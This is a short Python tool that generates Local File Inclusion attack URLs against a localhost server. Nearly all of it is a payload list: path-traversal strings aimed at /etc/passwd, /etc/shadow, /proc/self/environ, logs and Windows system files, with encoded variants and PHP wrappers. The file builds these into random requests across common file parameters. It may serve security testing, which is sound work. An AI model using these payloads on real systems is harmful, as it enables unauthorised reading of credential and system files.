"""
tools/lfi_atk.py - Local File Inclusion attack payload generator
"""
import random

_BASIC = [
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../etc/shadow",
    "../../proc/self/environ",
    "../../var/log/apache2/access.log",
]

_WINDOWS = [
    "..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "..\\..\\..\\windows\\win.ini",
    "..\\..\\boot.ini",
    "C:/Windows/win.ini",
]

_ENCODED = [
    "..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252F..%252Fetc%252Fpasswd",
]

_PHP_WRAPPERS = [
    "php://filter/convert.base64-encode/resource=index.php",
    "php://input",
    "file:///etc/passwd",
]

ALL_PAYLOADS = _BASIC + _WINDOWS + _ENCODED + _PHP_WRAPPERS

LFI_PATHS  = ["/get", "/file", "/download", "/include", "/load", "/read", "/view"]
LFI_PARAMS = ["file", "page", "include", "path", "template", "doc", "resource"]


def generate():
    payload = random.choice(ALL_PAYLOADS)
    path    = random.choice(LFI_PATHS)
    param   = random.choice(LFI_PARAMS)
    url     = "http://localhost:8000" + path + "?" + param + "=" + payload
    return url, payload
